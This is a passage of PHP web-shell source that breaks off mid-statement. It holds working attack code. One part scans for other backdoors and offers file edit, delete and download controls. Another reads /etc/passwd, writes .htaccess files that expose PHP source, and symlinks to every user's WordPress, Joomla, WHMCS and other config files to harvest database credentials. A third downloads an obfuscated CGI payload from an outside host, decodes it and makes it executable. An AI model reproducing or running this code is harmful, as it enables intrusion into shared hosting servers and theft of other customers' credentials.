<a href="?view=<?=$file?>&bug=<?=$val?>" target="_blank" id="<?=clearspace($filn)?>_link"><?=$file?></a><form action="" method="post" id="<?=clearspace($filn)?>_form" class="sembunyi" style="margin:0;padding:0;"><input type="hidden" name="oldname" value="<?=$filn?>" style="margin:0;padding:0;" /><input class="inputz" style="width:200px;" type="text" name="newname" value="<?=$filn?>" /><input class="inputzbut" type="submit" name="rename" value="rename" /><input class="inputzbut" type="submit" name="cancel" value="cancel" onclick="tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');" /></form>
</td>
<td align="center"><?=substr(sprintf('%o',fileperms($file)),-4)?></td>
<td align="center"><?=get_perms($file)?></td>
<td align="center"><?=$is_writable?></td>
<td align="center"><font color="red"><?=$last?></font></td>
<td align="right"><font color="red"><?=$size?> byte</font></td>
<td align="center"><a href="?edit=<?=$file?>&bug=<?=$val?>" target="_blank">edit</a> | <a href="javascript:tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');">ren</a> | <a href="?delete=<?=$file?>&bug=<?=$val?>" target="_blank">del</a> | <a href="?dl=<?=$file?>&bug=<?=$val?>">down</a>
</td>
</tr>
<?php
            }
          }
          if($sis<>"1") {
            if((@preg_match("/system\((.*?)\)/",$op))&&(@preg_match("/<pre>/",$op))&&(@preg_match("/empty\((.*?)\)/",$op))) {
              $sis="2";
              $i++;
              $val="hidden shell";
              ?>
<tr onmouseover="mover(this)" onmouseout="mout(this)">
<td align="center"><font color="blue"><?=$i?></font></td>
<td align="center"><font color="blue"><?=$val?></font></td>
<td align="left">
<a href="?view=<?=$file?>&bug=<?=$val?>" target="_blank" id="<?=clearspace($filn)?>_link"><?=$file?></a><form action="" method="post" id="<?=clearspace($filn)?>_form" class="sembunyi" style="margin:0;padding:0;"><input type="hidden" name="oldname" value="<?=$filn?>" style="margin:0;padding:0;" /><input class="inputz" style="width:200px;" type="text" name="newname" value="<?=$filn?>" /><input class="inputzbut" type="submit" name="rename" value="rename" /><input class="inputzbut" type="submit" name="cancel" value="cancel" onclick="tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');" /></form>
</td>
<td align="center"><?=substr(sprintf('%o',fileperms($file)),-4)?></td>
<td align="center"><?=get_perms($file)?></td>
<td align="center"><?=$is_writable?></td>
<td align="center"><font color="blue"><?=$last?></font></td>
<td align="right"><font color="blue"><?=$size?> byte</font></td>
<td align="center"><a href="?edit=<?=$file?>&bug=<?=$val?>" target="_blank">edit</a> | <a href="javascript:tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');">ren</a> | <a href="?delete=<?=$file?>&bug=<?=$val?>" target="_blank">del</a> | <a href="?dl=<?=$file?>&bug=<?=$val?>">down</a>
</td>
</tr>
<?php
            }
          }
          if($sis=="0") {
            foreach($cek as $bugs) {
              if($bugs<>"") {
                if(@preg_match("/$bugs\((.*?)\)/",$op)) {
                  $i++;
                  ?>
<tr onmouseover="mover(this)" onmouseout="mout(this)">
<td align="center"><?=$i?></td>
<td align="center"><?=$bugs?></td>
<td align="left">
<a href="?view=<?=$file?>&bug=<?=$val?>" target="_blank" id="<?=clearspace($filn)?>_link"><?=$file?></a><form action="" method="post" id="<?=clearspace($filn)?>_form" class="sembunyi" style="margin:0;padding:0;"><input type="hidden" name="oldname" value="<?=$filn?>" style="margin:0;padding:0;" /><input class="inputz" style="width:200px;" type="text" name="newname" value="<?=$filn?>" /><input class="inputzbut" type="submit" name="rename" value="rename" /><input class="inputzbut" type="submit" name="cancel" value="cancel" onclick="tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');" /></form>
</td>
<td align="center"><?=substr(sprintf('%o',fileperms($file)),-4)?></td>
<td align="center"><?=get_perms($file)?></td>
<td align="center"><?=$is_writable?></td>
<td align="center"><?=$last?></td>
<td align="right"><?=$size?> byte</td>
<td align="center"><a href="?edit=<?=$file?>&bug=<?=$bugs?>" target="_blank">edit</a> | <a href="javascript:tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');">ren</a> | <a href="?delete=<?=$file?>&bug=<?=$bugs?>" target="_blank">del</a> | <a href="?dl=<?=$file?>&bug=<?=$val?>">down</a>
</td>
</tr>
<?php
                }
              }
            }
          }
          if($_POST['textV']<>"") {
            $text=$_POST['textV'];
            if(@preg_match("/$text/",$op)) {
              $i++;
              ?>
<tr onmouseover="mover(this)" onmouseout="mout(this)">
<td align="center"><?=$i?></td>
<td align="center"><?=$text?></td>
<td align="left">
<a href="?view=<?=$file?>&bug=<?=$val?>" target="_blank" id="<?=clearspace($filn)?>_link"><?=$file?></a><form action="" method="post" id="<?=clearspace($filn)?>_form" class="sembunyi" style="margin:0;padding:0;"><input type="hidden" name="oldname" value="<?=$filn?>" style="margin:0;padding:0;" /><input class="inputz" style="width:200px;" type="text" name="newname" value="<?=$filn?>" /><input class="inputzbut" type="submit" name="rename" value="rename" /><input class="inputzbut" type="submit" name="cancel" value="cancel" onclick="tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');" /></form>
</td>
<td align="center"><?=substr(sprintf('%o',fileperms($file)),-4)?></td>
<td align="center"><?=get_perms($file)?></td>
<td align="center"><?=$is_writable?></td>
<td align="center"><?=$last?></td>
<td align="right"><?=$size?> byte</td>
<td align="center"><a href="?edit=<?=$file?>&bug=<?=$text?>" target="_blank">edit</a> | <a href="javascript:tukar('<?=clearspace($filn)?>_link','<?=clearspace($filn)?>_form');">ren</a> | <a href="?delete=<?=$file?>&bug=<?=$text?>" target="_blank">del</a> | <a href="?dl=<?=$file?>&bug=<?=$val?>">down</a>
</td>
</tr>
<?php
            }
          }
        }
      }
    }
    if($i==0) {
      foreach($cek as $bugs) {
        if($bugs<>"") {
          $x++;
          ?>
<tr onmouseover="mover(this)" onmouseout="mout(this)">
<td align="center"><?=$x?></td>
<td align="center"><?=$bugs?></td>
<td align="center">!!!!</td>
<td align="center">?????????</td>
<td align="center">???</td>
<td align="center">not exist</td>
<td align="center">no record</td>
<td align="right">-&nbsp;&nbsp;&nbsp;&nbsp;byte</td>
<td align="center">- | - | - | -</td>
</tr>
<?php
        }
      }
    }
    ?>
<tr><th colspan="9">Founded <?=$i?> Files Scanned</th></tr>
</table>
<?php
  }
  else {
    ?>
<center>
<?php
$find=array('default','base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
    ?>
<form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
<center>
<table class="tabnet" width="200">
<tr><th>Select Scan Type</th></tr>
<tr><td >
<script language="javascript">
function cekKlik(){
if (!document.fCheck.cekV.checked)
 document.fCheck.textV.disabled=true;
else
 document.fCheck.textV.disabled=false;
if(document.fCheck.cekV.checked){
 master = master + 1;
}else{
 if(master > 0 ){
master = master - 1;
 }else{
master = master;
 }
}
if(master != 0){
 document.fCheck.Submit.disabled=false;
 document.fCheck.Submit.value='Start !';
}else{
 document.fCheck.Submit.disabled=true;
 document.fCheck.Submit.value='Stop !';
} 
} 
</script>
<?php
foreach($find as $bug) {
      ?>
<script language="javascript">
var master = 0;
function checkValue<?=$bug?>(){
if(document.fCheck.<?=$bug?>.checked){
 master = master + 1;
}else{
 if(master > 0 ){
master = master - 1;
 }else{
master = master;
 }
}
if(master != 0){
 document.fCheck.Submit.disabled=false;
 document.fCheck.Submit.value='Start !';
}else{
 document.fCheck.Submit.disabled=true;
 document.fCheck.Submit.value='Stop !';
}
}
</script>
<input onclick="checkValue<?=$bug?>();" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />&nbsp;<?=$bug?><br/>
<?php
    }
    ?>
<input name="cekV" type="checkbox" onClick="cekKlik();" id="cekV" value="cekV">
<input class="inputz" disabled="disabled" name="textV" value="other_key_word" onFocus="this.select()" type="text" id="textV">
<input type="hidden" name="asal" value="abcd"></td>
</tr>
<tr><th colspan="2">
<input disabled="disabled" type="submit" name="Submit" value="Stop !" class="inputzbut"/></form></th>
</tr>
</table>
<?php
  }
  ?>
<?php
}
elseif(isset($_GET['x'])&&($_GET['x']=='configsss')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=configsss" method="post" style="-webkit-margin-before:20px;">
<br/><center>
[Config] : <span class="gaya">Get With Path</span> <input type="submit" value="Go !" class="inputzbut" name="pathconfig">
</center>
</form>
<?php
echo "<center>";
  if(isset($_POST['pathconfig'])) {
    echo '<form method="post"><textarea width="500" rows="10" name="user" class="outputz">';
    $users=file("/etc/passwd");
    foreach($users as $user) {
      echo $user;
    }
    echo '</textarea><br/><br/>[Name] : <input size="35" name="foldername" type="text" value="folder_name" class="inputz"><input class="inputzbut" type="submit" name="pathconfigstart" value="Go !" /></form>';
  }
  if(isset($_POST['pathconfigstart'])) {
    $nc=$_POST['foldername'];
    $dir=mkdir($nc,0755);
    $r=" Options all \n DirectoryIndex syntax.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $f=fopen($nc.'/.htaccess','w');
    fwrite($f,$r);
    $consym="<a href=".$alamat."/".$nc." style='text-decoration:none;' target='_blank'/>DONE</a>";
    echo "<span class='gaya'>[</span> $consym <span class='gaya'>]</span>";
    $usrs=explode("\n",$_POST['user']);
    $configuration=array("wp-config.php","wp/wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","home/wp-config.php","main/wp-config.php","site/wp-config.php","web/wp-config.php","joomla/configuration.php","blog/configuration.php","home/configuration.php","main/configuration.php","site/configuration.php","web/configuration.php","vb/includes/config.php","includes/config.php","includes/koneksi.php","config/koneksi.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","lib/config.php","includes/configure.php","forum/includes/config.php");
    foreach($usrs as $us) {
      $usr=explode(":",$us);
      $usz=$usr['5'];
      $usx=$usr['0'];
      foreach($configuration as $c) {
        $rs=$usz."/".$c;
        $r=$nc."/".$usx." .. ".$c;
        symlink($rs,$r);
      }
    }
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='configss')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=configss" method="post" style="-webkit-margin-before:20px;">
<br/><center>
[Config] : <span class="gaya">Get With Manual</span> <input type="submit" value="Go !" class="inputzbut" name="symlinks">
</center>
</form>
<?php
echo "<center>";
  if(isset($_POST['symlinks'])) {
    echo '<center><form method="post"><table class="tabnet"><th colspan="2">Manual Symlink</th><tr>
<td>File Path &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</td><td><input class="inputz" type="text" name="filenya" value="/home/'.$user.'/public_html/config.php" size="50"/></td></tr>
<tr><td>Symlink Name :</td><td><input class="inputz" type="text" name="symfile" value="config.txt" size="50"/></td></tr>
<tr><th colspan="2"><input class="inputzbut" type="submit" value="Symlink" name="symlinkz" /></th></tr></table></form></center>';
  }
  $filenya=$_POST['filenya'];
  $symfile=$_POST['symfile'];
  if(isset($_POST['symlinkz'])) {
    mkdir('sym',0755);
    chdir('sym');
    $rt="Options all \n DirectoryIndex syntax.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $fo=fopen('.htaccess','w');
    fwrite($fo,$rt);
    symlink($filenya,$symfile);
    echo '<center><span class="gaya">[</span> <a target="_blank" href="sym/'.$symfile.'" >DONE</a> <span class="gaya">]</span></center>';
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='configs')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=configs" method="post" style="-webkit-margin-before:20px;">
<br/><center>
[Config] : <span class="gaya">Get With Perl</span> <input type="submit" value="Go !" class="inputzbut" name="perlconfig">
</center>
</form>
<?php
echo "<center>";
  $dn=$_POST['dirname'];
  if(isset($_POST['perlconfig'])) {
    echo '<form method="post">[Name] : <input size="35" name="dirname" type="text" value="folder_name" class="inputz"><input class="inputzbut" type="submit" name="perlconfigstart" value="Go !" /></form>';
  }
  if(isset($_POST['perlconfigstart'])) {
    mkdir($dn,0755);
    chdir($dn);
    $kokdosya=".htaccess";
    $dosya_adi="$kokdosya";
    $dosya=fopen($dosya_adi,'w')ordie("Error");
    $metin="Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .bin
AddHandler cgi-script .bin
AddHandler cgi-script .bin";
    fwrite($dosya,$metin);
    fclose($dosya);
    $configshell=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/config.cgi');
    $file=fopen("config.bin","w+");
    $write=fwrite($file,gzinflate(base64_decode(str_rot13(strrev($configshell)))));
    fclose($file);
    chmod("config.bin",0755);
    $alamat=str_replace($_SERVER['DOCUMENT_ROOT'],"",@getcwd());
    echo "<span class='gaya'>[</span> <a href='".$alamat."' target='_blank'>DONE</a> <span class='gaya'>]</span><br/><br/><iframe src=".$alamat."/config.bin width=97% height=280px frameborder=0 style='overflow-y:hidden;'></iframe></form>";
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='config')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=config" method="post" style="-webkit-margin-before:20px;">
<br/><center>
[Config] : <span class="gaya">Get With PHP</span> <input type="submit" value="Go !" class="inputzbut" name="phpconfig">
</center>
</form>
<?php
echo "<center>";
  if(isset($_POST['phpconfig'])) {
    echo '<form method="post"><textarea width="500" rows="10" name="user" class="outputz">';
    $users=file("/etc/passwd");
    foreach($users as $user) {
      echo $user;
    }
    echo '</textarea><br/><br/>[Name] : <input size="35" name="foldername" type="text" value="folder_name" class="inputz"><input class="inputzbut" type="submit" name="phpconfigstart" value="Go !" /></form>';
  }
  if(isset($_POST['phpconfigstart'])) {
    $nc=$_POST['foldername'];
    $dir=mkdir($nc,0755);
    $r=" Options all \n DirectoryIndex syntax.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $f=fopen($nc.'/.htaccess','w');
    fwrite($f,$r);
    $consym="<a href=".$alamat."/".$nc." style='text-decoration:none;' target='_blank'/>DONE</a>";
    echo "<span class='gaya'>[</span> $consym <span class='gaya'>]</span>";
    $usrs=explode("\n",$_POST['user']);
    $configuration=array("wp-config.php","wp/wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","home/wp-config.php","main/wp-config.php","site/wp-config.php","web/wp-config.php","joomla/configuration.php","blog/configuration.php","home/configuration.php","main/configuration.php","site/configuration.php","web/configuration.php","vb/includes/config.php","includes/config.php","includes/koneksi.php","config/koneksi.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","lib/config.php","includes/configure.php","forum/includes/config.php");
    foreach($usrs as $us) {
      $usr=explode(":",$us);
      $usr[0]."\n";
      foreach($usr as $uss) {
        $us=trim($uss);
        foreach($configuration as $c) {
          $rs="/home/".$us."/public_html/".$c;
          $r=$nc."/".$us." .. ".$c;
          symlink($rs,$r);
        }
      }
    }
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='cms')) {
  echo "<br/><center style='-webkit-margin-before:20px;'>";
  $base_url='http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']);
  @mkdir('tmp',0777);
  @symlink("/","tmp/root");
  $htaccss="Options all 
 DirectoryIndex syntax.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
 AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
  file_put_contents("tmp/.htaccess",$htaccss);
  if(is_readable("/var/named")) {
    $list=scandir("/var/named");
    $current_dir=posix_getcwd();
    $dir=explode("/",$current_dir);
    foreach($list as $domain) {
      if(strpos($domain,".db")) {
        $domain=str_replace('.db','',$domain);
        $owner=posix_getpwuid(fileowner("/etc/valiases/".$domain));
        error_reporting(0);
        $current_dir=posix_getcwd();
        $dir=explode("/",$current_dir);
        symlink($owner['dir'].'/'.$dir[3].'/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/blog/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/home/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/main/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/new/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/portal/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/site/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/web/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/wp/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/wordpress/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v1/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v2/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v3/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v4/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v5/wp-config.php',"tmp/".$owner['name'].'-WordPress.txt');
        symlink($owner['dir'].'/'.$dir[3].'/config/koneksi.php',"tmp/".$owner['name'].'-Lokomedia.txt');
        symlink($owner['dir'].'/'.$dir[3].'/konfigurasi/koneksi.php',"tmp/".$owner['name'].'-Formulasi.txt');
        symlink($owner['dir'].'/'.$dir[3].'/lib/config.php',"tmp/".$owner['name'].'-Balitbang.txt');
        symlink($owner['dir'].'/'.$dir[3].'/config.php',"tmp/".$owner['name'].'-PhpBB.txt');
        symlink($owner['dir'].'/'.$dir[3].'/includes/config.php',"tmp/".$owner['name'].'-vBulletin.txt');
        symlink($owner['dir'].'/'.$dir[3].'/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/blog/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/home/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/joomla/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/main/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/new/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/portal/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/site/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/web/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/joomla/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v1/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v2/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v3/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v4/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/v5/configuration.php',"tmp/".$owner['name'].'-Joomla.txt');
        symlink($owner['dir'].'/'.$dir[3].'/conf_global.php',"tmp/".$owner['name'].'-IPB.txt');
        symlink($owner['dir'].'/'.$dir[3].'/inc/config.php',"tmp/".$owner['name'].'-MyBB.txt');
        symlink($owner['dir'].'/'.$dir[3].'/Settings.php',"tmp/".$owner['name'].'-SMF.txt');
        symlink($owner['dir'].'/'.$dir[3].'/sites/default/settings.php',"tmp/".$owner['name'].'-Drupal.txt');
        symlink($owner['dir'].'/'.$dir[3].'/e107_config.php',"tmp/".$owner['name'].'-e107.txt');
        symlink($owner['dir'].'/'.$dir[3].'/datas/config.php',"tmp/".$owner['name'].'-Seditio.txt');
        symlink($owner['dir'].'/'.$dir[3].'/includes/configure.php',"tmp/".$owner['name'].'-osCommerce.txt');
        symlink($owner['dir'].'/'.$dir[3].'/client/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/clientes/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/support/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/supportes/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/whmcs/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/domain/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/hosting/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/whmc/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/billing/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/portal/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/order/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/clientarea/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
        symlink($owner['dir'].'/'.$dir[3].'/domains/configuration.php',"tmp/".$owner['name'].'-WHMCS.txt');
      }
    }
  }
  $etc=file_get_contents("/etc/passwd");
  $etcz=explode("\n",$etc);
  foreach($etcz as $etz) {
    $etcc=explode(":",$etz);
    error_reporting(0);
    $current_dir=posix_getcwd();
    $dir=explode("/",$current_dir);
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/home/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/main/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/new/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wordpress/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v1/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v2/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v3/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v4/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v5/wp-config.php','tmp/'.$etcc[0].'-WordPress.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config/koneksi.php','tmp/'.$etcc[0].'-Lokomedia.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/konfigurasi/koneksi.php','tmp/'.$etcc[0].'-Formulasi.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/lib/config.php','tmp/'.$etcc[0].'-Balitbang.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php','tmp/'.$etcc[0].'-PhpBB.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php','tmp/'.$etcc[0].'-vBulletin.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/home/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/main/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/new/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v1/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v2/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v3/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v4/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/v5/configuration.php','tmp/'.$etcc[0].'-Joomla.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php','tmp/'.$etcc[0].'-IPB.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php','tmp/'.$etcc[0].'-MyBB.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php','tmp/'.$etcc[0].'-SMF.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php','tmp/'.$etcc[0].'-Drupal.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php','tmp/'.$etcc[0].'-e107.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php','tmp/'.$etcc[0].'-Seditio.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php','tmp/'.$etcc[0].'-osCommerce.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
    symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php','tmp/'.$etcc[0].'-WHMCS.txt');
